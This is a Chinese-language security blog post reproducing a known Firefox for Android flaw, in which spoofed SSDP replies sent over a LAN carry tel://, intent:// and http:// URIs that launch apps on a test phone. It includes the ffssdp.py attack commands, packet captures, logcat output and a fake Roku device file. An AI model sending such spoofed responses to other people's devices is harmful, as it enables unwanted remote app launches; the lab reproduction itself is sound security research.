<li><strong>scheme&#x3D;<scheme_type></strong>(可选)：指定 Intent 的 data URI 部分应该使用的协议方案 (Scheme)。<strong>注意:</strong> 这与整个 URI 的 intent: scheme 不同。<ul>
<li><strong>示例:</strong> scheme&#x3D;http, scheme&#x3D;tel, scheme&#x3D;geo。如果你在前面提供了 &#x2F;&#x2F;host&#x2F;path，这个 scheme 会被用来构成完整的 Data URI，例如 scheme&#x3D;http + &#x2F;&#x2F;example.com&#x2F; -&gt; Data 是 <a class="link"   target="_blank" rel="noopener" href="http://example.com/%E3%80%82" >http://example.com/。<i class="fas fa-external-link-alt"></i></a></li>
</ul>
</li>
<li>-S. 前缀：传递附加数据（键值对）。</li>
</ul>
</li>
</ul>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>检测ActivityManage日志<br>它负责管理应用程序的生命周期（启动、暂停、停止）、管理 Activity 栈（用户看到的界面切换）、启动服务，以及<strong>最关键的——处理和分发 Intent</strong></p>
<h3 id="安卓默认的URL"><a href="#安卓默认的URL" class="headerlink" title="安卓默认的URL"></a>安卓默认的URL</h3><h4 id="拨号器-1"><a href="#拨号器-1" class="headerlink" title="拨号器"></a>拨号器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;tel://20250419&quot; </span><br><span class="line"></span><br><span class="line">  _____  _____                 .___</span><br><span class="line">_/ ____\/ ____\______ ______ __| _/_____</span><br><span class="line">\   __\\   __\/  ___//  ___// __ |\____ \</span><br><span class="line"> |  |   |  |  \___ \ \___ \/ /_/ ||  |_&gt; &gt;</span><br><span class="line"> |__|   |__| /____  &gt;____  &gt;____ ||   __/</span><br><span class="line">                  \/     \/     \/|__|</span><br><span class="line"></span><br><span class="line">...by initstring</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#######################################</span></span></span><br><span class="line">[*] MSEARCH LISTENER:        eth0</span><br><span class="line">[*] INTENT:                  tel://20250419</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#######################################</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[M-SEARCH]     New Host 192.168.165.49, Service Type: roku:ecp</span><br><span class="line">[M-SEARCH]     New Host 192.168.165.49, Service Type: media:router</span><br><span class="line">[M-SEARCH]     New Host 192.168.165.247, Service Type: urn:dial-multiscreen-org:service:dial:1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>系统响应并启动了拨号器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flame:/ # logcat | grep ActivityManager</span><br><span class="line">04-19 11:42:04.980  1435  1690 I ActivityManager: Start proc 19569:com.google.android.dialer/u0a142 for activity &#123;com.google.android.dialer/com.android.dialer.main.impl.MainActivity&#125;</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419114231.png"
                       
                 ></p>
<p>这是其中一组相关流量信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 03:42:02 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: tel://20250419</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:f750933a-d123-c342-ae48-45d6a1f22c56</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:f750933a-d123-c342-ae48-45d6a1f22c56::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure>


<h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;file://storage/emulated/0/Download/access.log&quot;</span><br></pre></td></tr></table></figure>
<p>firefox无事发生</p>
<hr>
<p>Android系统上使用file:&#x2F;&#x2F;协议的限制。Android的WebView和浏览器出于安全考虑，通常不允许通过file:&#x2F;&#x2F;协议访问本地文件<br>所以无法访问</p>
<p><strong>各浏览器策略对比</strong></p>
<table>
<thead>
<tr>
<th><strong>浏览器</strong></th>
<th><code>file://</code> 支持情况</th>
<th>安全策略</th>
</tr>
</thead>
<tbody><tr>
<td>Firefox</td>
<td>默认禁用，需 <code>about:config</code> 调整</td>
<td>设置 <code>security.fileuri.strict_origin_policy</code> 为 <code>false</code> 可部分启用</td>
</tr>
<tr>
<td>Chrome</td>
<td>完全禁止</td>
<td>控制台显示 <code>Not allowed to load local resource</code></td>
</tr>
<tr>
<td>Samsung Internet</td>
<td>允许访问 <code>/sdcard/</code> 子目录</td>
<td>需手动授权文件夹访问权限</td>
</tr>
<tr>
<td>Via Browser</td>
<td>支持自定义本地文件访问</td>
<td>内置文件管理器导航</td>
</tr>
</tbody></table>
<h3 id="构建应用关联的Android-Intent-URL"><a href="#构建应用关联的Android-Intent-URL" class="headerlink" title="构建应用关联的Android Intent URL"></a>构建应用关联的Android Intent URL</h3><h4 id="首先是和firefox相关联的url"><a href="#首先是和firefox相关联的url" class="headerlink" title="首先是和firefox相关联的url"></a>首先是和firefox相关联的url</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;intent://example.com/#Intent;scheme=http;package=org.mozilla.firefox;end&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>流量信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 08:40:23 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: intent://example.com/#Intent;scheme=http;package=org.mozilla.firefox;end</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:076edbd0-e133-9a30-879a-3c62235bba08</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:076edbd0-e133-9a30-879a-3c62235bba08::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure>
<p>结果<br><img  
                       lazyload
                       alt="image"
                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419164140.png"
                       
                 ></p>
<h4 id="然后是尝试触发chrome"><a href="#然后是尝试触发chrome" class="headerlink" title="然后是尝试触发chrome"></a>然后是尝试触发chrome</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;intent://example.com/#Intent;scheme=http;package=com.android.chrome;end&quot;</span><br></pre></td></tr></table></figure>
<p>流量信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 08:45:50 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: intent://example.com/#Intent;scheme=http;package=com.android.chrome;end</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:905594bc-7745-19ec-d5dd-ca9f47a60b7e</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: urn:dial-multiscreen-org:service:dial:1</span><br><span class="line">USN: uuid:905594bc-7745-19ec-d5dd-ca9f47a60b7e::urn:dial-multiscreen-org:service:dial:1</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure>

<p>结果<br><img  
                       lazyload
                       alt="image"
                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419164502.png"
                       
                 ><br>当然了firefox必须是在启动状态的，不然无法触发</p>
<h3 id="检测http"><a href="#检测http" class="headerlink" title="检测http"></a>检测http</h3><p>然后检测http头的信息<br>”打开 Web 浏览器的 URI 方案定义为 <code>http</code> 或 <code>https</code>。但是，Firefox 移动版中的原生 SSDP 代码会自行处理这些 URL，而不会将它们传递给 Intent 系统。“<br>现在就是检测，当出现<a class="link"   target="_blank" rel="noopener" href="http://ip.xml时是不是由firefox进行处理/" >http://ip.xml时是不是由firefox进行处理<i class="fas fa-external-link-alt"></i></a><br>这里进行了两次测试</p>
<h4 id="直接访问example-com"><a href="#直接访问example-com" class="headerlink" title="直接访问example.com"></a>直接访问example.com</h4><p>运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;http://example.com&quot; </span><br></pre></td></tr></table></figure>

<p>信息成功传递</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 06:31:21 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://example.com</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是firefox无事发生</p>
<h4 id="访问http-example-com-device-xml"><a href="#访问http-example-com-device-xml" class="headerlink" title="访问http://example.com/device.xml"></a>访问<a class="link"   target="_blank" rel="noopener" href="http://example.com/device.xml" >http://example.com/device.xml<i class="fas fa-external-link-alt"></i></a></h4><p>指令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;http://example.com/device.xml&quot; </span><br></pre></td></tr></table></figure>
<p>pcap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 07:29:47 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://example.com/device.xml</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure>
<p>firefox无事发生</p>
<h4 id="部署http服务设备"><a href="#部署http服务设备" class="headerlink" title="部署http服务设备"></a>部署http服务设备</h4><p>这一步是为了检测，是不是由firefox启动的intent。自己部署服务器就能更好的看到日志信息。<br>1.在termux安装python</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install python</span><br></pre></td></tr></table></figure>
<p>2.创建updp文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ./upnp-server &amp;&amp; cd ./upnp-server</span><br><span class="line">nano device.xml</span><br></pre></td></tr></table></figure>
<p>device.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-upnp-org:device-1-0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">specVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">major</span>&gt;</span>1<span class="tag">&lt;/<span class="name">major</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">minor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">minor</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">specVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">device</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">deviceType</span>&gt;</span>urn:roku.com:device:ecp:1<span class="tag">&lt;/<span class="name">deviceType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">friendlyName</span>&gt;</span>My Fake Roku<span class="tag">&lt;/<span class="name">friendlyName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">manufacturer</span>&gt;</span>Test Corp<span class="tag">&lt;/<span class="name">manufacturer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelName</span>&gt;</span>UPnP Test Device<span class="tag">&lt;/<span class="name">modelName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">UDN</span>&gt;</span>uuid:7b9ef4eb-c8f4-e710-cff9-cd13c3f33f82<span class="tag">&lt;/<span class="name">UDN</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">serviceList</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">service</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">serviceType</span>&gt;</span>urn:roku.com:service:ecp:1<span class="tag">&lt;/<span class="name">serviceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">serviceId</span>&gt;</span>urn:roku.com:serviceId:ecp<span class="tag">&lt;/<span class="name">serviceId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">controlURL</span>&gt;</span>/control<span class="tag">&lt;/<span class="name">controlURL</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">serviceList</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">device</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>3.启动服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8080 --bind 0.0.0.0</span><br></pre></td></tr></table></figure>
<p>4.在虚拟机启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 ./ffssdp.py eth0 -t &quot;http://192.168.165.49:8080/device.xml&quot; </span><br></pre></td></tr></table></figure>
<p>这是部分流量文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 07:53:00 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://192.168.165.49:8080/device.xml</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:ddc5543d-9945-5a23-62be-360ea199a831</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:ddc5543d-9945-5a23-62be-360ea199a831::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure>
<p>文件被访问了<br><img  
                       lazyload
                       alt="image"
                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419155531.png"
                       
                 ><br>此外在调试中发现，开启reqable尝试对firefox进行抓包时，无反应，关掉reqable时才开始正常访问xml文件<br><strong>启用 Firefox 网络监控</strong><br>在 Firefox 地址栏输入：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about:networking</span><br></pre></td></tr></table></figure>
<p>可以看到的确是访问了目标xml文件<br><img  
                       lazyload
                       alt="image"
                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419161107.png"
                       
                 ></p>
<p>为了追踪其来源，编写了server.py文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_request</span>(<span class="params">self, code=<span class="string">&#x27;-&#x27;</span>, size=<span class="string">&#x27;-&#x27;</span></span>):</span><br><span class="line">        logging.info(</span><br><span class="line">            <span class="string">f&quot;UA:<span class="subst">&#123;self.headers[<span class="string">&#x27;User-Agent&#x27;</span>]&#125;</span> | IP:<span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span> | PATH:<span class="subst">&#123;self.path&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> logging</span><br><span class="line">    logging.basicConfig(</span><br><span class="line">        filename=<span class="string">&#x27;access.log&#x27;</span>,</span><br><span class="line">        level=logging.INFO,</span><br><span class="line">        <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8080</span>), CustomHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
<p>这是部分日志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2025-04-19 16:18:18,891 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml</span><br><span class="line">2025-04-19 16:18:19,890 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml</span><br><span class="line">2025-04-19 16:18:20,898 - UA:Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0 | IP:192.168.165.49 | PATH:/device.xml</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在这份日志里只有firefox的记录，也就是说，http请求的确是firefox在处理</p>
<hr>
<p>这说明该漏洞不是简单的将LOCATION当成Intent 执行，对于http:&#x2F;&#x2F;和https:&#x2F;&#x2F;这样的标准的字段它有自己的处理模式，而对于非常规范围内的tel:&#x2F;&#x2F; 或 intent:&#x2F;&#x2F; 的处理路径它将其转发给了安卓处理</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://initblog.com/2020/firefox-android/" >https://initblog.com/2020/firefox-android/<i class="fas fa-external-link-alt"></i></a><br>另一个视角的博客:<a class="link"   target="_blank" rel="noopener" href="https://blog.mozilla.org/attack-and-defense/2020/11/10/firefox-for-android-lan-based-intent-triggering/?utm_source=chatgpt.com" >https://blog.mozilla.org/attack-and-defense/2020/11/10/firefox-for-android-lan-based-intent-triggering/?utm_source=chatgpt.com<i class="fas fa-external-link-alt"></i></a><br>firefox官网，在这里查找漏洞信息:<a class="link"   target="_blank" rel="noopener" href="https://www.mozilla.org/en-US/security/advisories/" >https://www.mozilla.org/en-US/security/advisories/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://developer.android.com/reference/android/app/ActivityManager" >https://developer.android.com/reference/android/app/ActivityManager<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://developer.android.com/guide/components/intents-filters?hl=zh-cn" >https://developer.android.com/guide/components/intents-filters?hl=zh-cn<i class="fas fa-external-link-alt"></i></a><br>Android 开源项目 (AOSP) 源代码 :<a class="link"   target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://cs.android.com/" >cs.android.com<i class="fas fa-external-link-alt"></i></a></p>

                    
                </div>

                
                        
<div class="post-copyright-info-container border-box">
    <div class="copyright-info-content border-box">
        <div class="copyright-info-top border-box">
            <div class="copyright-post-title border-box text-ellipsis">
                基于LAN的intent触发
            </div>

            <div class="copyright-post-link border-box text-ellipsis">
                2025/04/19/基于LAN的intent触发/
            </div>
        </div>

        <div class="copyright-info-bottom border-box">
            <div class="copyright-post-author bottom-item">
                <div class="type">
                    作者
                </div>
                <div class="content">arch3rn4r</div>
            </div>

            <div class="post-time bottom-item">
                <div class="type">
                    发布于
                </div>
                <div class="content">2025-04-19 18:09</div>
            </div>


            <div class="post-license bottom-item">
                <div class="type">
                    许可
                </div>
                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
                        
                            <i class="fa-brands fa-creative-commons"></i>
                            <i class="fa-brands fa-creative-commons-by"></i>
                            <i class="fa-brands fa-creative-commons-nc"></i>
                            <i class="fa-brands fa-creative-commons-sa"></i>
                        
                    </a>
                </div>
            </div>
        </div>

        <i class="copyright-bg fa-solid fa-copyright"></i>
    </div>
    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                    </div>
                    <div>
                        
                            <div class="post-share-container border-box">
    <ul class="share-list-wrap border-box">
        <li class="qq share-item border-box flex-center tooltip"
            data-tooltip-content="分享到 QQ"
        >
            <i class="fa-brands fa-qq"></i>
        </li>
        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
            data-tooltip-content="分享到微信"
            data-tooltip-img-tip="微信扫一扫"
            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
        >
            <i class="fa-brands fa-weixin"></i>
        </li>
        <li class="weibo share-item border-box flex-center tooltip"
            data-tooltip-content="分享到微博"
        >
            <i class="fa-brands fa-weibo"></i>
        </li>
    </ul>
</div>

                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2025/04/26/%E4%BB%8Eble-ctf%E5%AD%A6%E8%93%9D%E7%89%99/"
                                   title="ble_ctf wp"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">ble_ctf wp</span>
                                        <span class="post-nav-item">上一篇</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2025/04/17/Frida-Labs-wp/"
                                   title="Frida-Labs wp"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Frida-Labs wp</span>
                                        <span class="post-nav-item">下一篇</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
